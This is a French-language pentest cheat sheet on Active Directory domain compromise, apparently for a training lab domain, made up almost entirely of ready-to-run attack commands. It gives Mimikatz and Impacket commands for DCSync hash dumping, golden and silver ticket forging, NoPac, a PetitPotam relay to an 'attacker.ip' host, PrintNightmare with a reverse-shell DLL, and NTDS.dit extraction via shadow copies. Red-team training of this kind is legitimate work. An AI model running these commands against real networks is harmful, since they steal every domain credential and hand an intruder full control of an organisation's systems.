# Compromission de Domaine
## Attaque DCSync
L'attaque DCSync imite un contrôleur de domaine pour demander les secrets d'utilisateurs via la réplication.
### Prérequis
Cette attaque nécessite que l'attaquant dispose des droits suivants:
- Replicating Directory Changes
- Replicating Directory Changes All
- Replicating Directory Changes in Filtered Set
### Exécution avec Mimikatz
```powershell
# Extraire le hash NTLM de l'administrateur de domaine
lsadump::dcsync /domain:inlanefreight.local /user:Administrator

# Extraire les hashes de tous les utilisateurs du domaine
lsadump::dcsync /domain:inlanefreight.local /all /csv
```
### Exécution avec Impacket
```bash
# Extraction des hashes pour un utilisateur spécifique
secretsdump.py -just-dc-user Administrator inlanefreight.local/user:password@dc.inlanefreight.local

# Extraction de tous les hashes avec plus d'options de sécurité
secretsdump.py -just-dc -outputfile hashes INLANEFREIGHT/adunn@172.16.5.5 -debug

# Version avec hash NTLM au lieu d'un mot de passe
secretsdump.py -just-dc -hashes :NTLM_HASH INLANEFREIGHT/adunn@172.16.5.5
```
## Attaques avec Golden Ticket
Un Golden Ticket est un TGT forgé qui donne un accès illimité à toutes les ressources du domaine.
### Création avec Mimikatz
```powershell
# Récupérer le hash NTLM du compte krbtgt
lsadump::dcsync /domain:inlanefreight.local /user:krbtgt

# Créer un Golden Ticket
kerberos::golden /domain:inlanefreight.local /sid:S-1-5-21-X-Y-Z /rc4:HASH_OF_KRBTGT /user:FakeAdmin /id:500 /ptt

# Vérifier le ticket
klist
```
### Exploitation
```powershell
# Accéder au partage SYSVOL du contrôleur de domaine
dir \\dc.inlanefreight.local\SYSVOL

# Exécuter psexec pour obtenir un shell
.\PsExec.exe \\dc.inlanefreight.local cmd.exe
```
## Attaques avec Silver Ticket
Un Silver Ticket est un TGS forgé qui donne accès à un service spécifique.

```powershell
# Créer un Silver Ticket pour le service CIFS
kerberos::golden /domain:inlanefreight.local /sid:S-1-5-21-X-Y-Z /rc4:HASH_OF_COMPUTER_ACCOUNT /user:FakeAdmin /service:cifs /target:server.inlanefreight.local /ptt

# Accéder au partage
dir \\server.inlanefreight.local\C$
```
## Exploitation de Vulnérabilités Critiques
### NoPac (SamAccountName Spoofing)

```bash
# Scanner pour la vulnérabilité
python3 scanner.py inlanefreight.local/user:password -dc-ip 10.10.10.10 -use-ldap

# Exploiter pour obtenir un TGT administrateur
python3 noPac.py inlanefreight.local/user:password -dc-ip 10.10.10.10 -dc-host dc01 -shell --impersonate administrator
```
### PetitPotam (NTLM Relay vers ADCS)

```bash
# Configurer le relais NTLM
sudo ntlmrelayx.py -t http://ca.inlanefreight.local/certsrv/certfnsh.asp --adcs --template DomainController

# Déclencher l'authentification
python3 PetitPotam.py attacker.ip dc.inlanefreight.local
```
### PrintNightmare

```powershell
# Exploitation de PrintNightmare
Import-Module .\CVE-2021-34527.ps1
Invoke-Nightmare -DLL "C:\Path\to\reverse.dll"
```
## Shadow Copies pour extraction de NTDS.dit
```powershell
# Créer une copie shadow du volume C:
vshadow.exe -nw -p C:

# Copier la base NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit C:\temp\ntds.dit.bak

# Exporter la clé SYSTEM
reg.exe save hklm\system C:\temp\system.bak

# Extraire les hashes (sur Kali)
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
## Points Clés

- Les attaques de compromission de domaine sont extrêmement puissantes
- Elles permettent de prendre le contrôle total de l'environnement AD
- Nettoyez les artefacts après avoir démontré la vulnérabilité
- Ces techniques doivent être utilisées avec extrême prudence dans un engagement réel
- Documentez précisément les preuves de concept et les risques associés

# Précision sur les SID pour Golden Ticket

Dans la section sur les Golden Tickets, ajouter comment récupérer le SID du domaine:

```powershell
# Obtenir le SID du domaine pour créer un Golden Ticket
Get-DomainSID
# ou
whoami /user
# Prenez les premiers chiffres du SID affiché jusqu'à l'avant-dernier tiret
```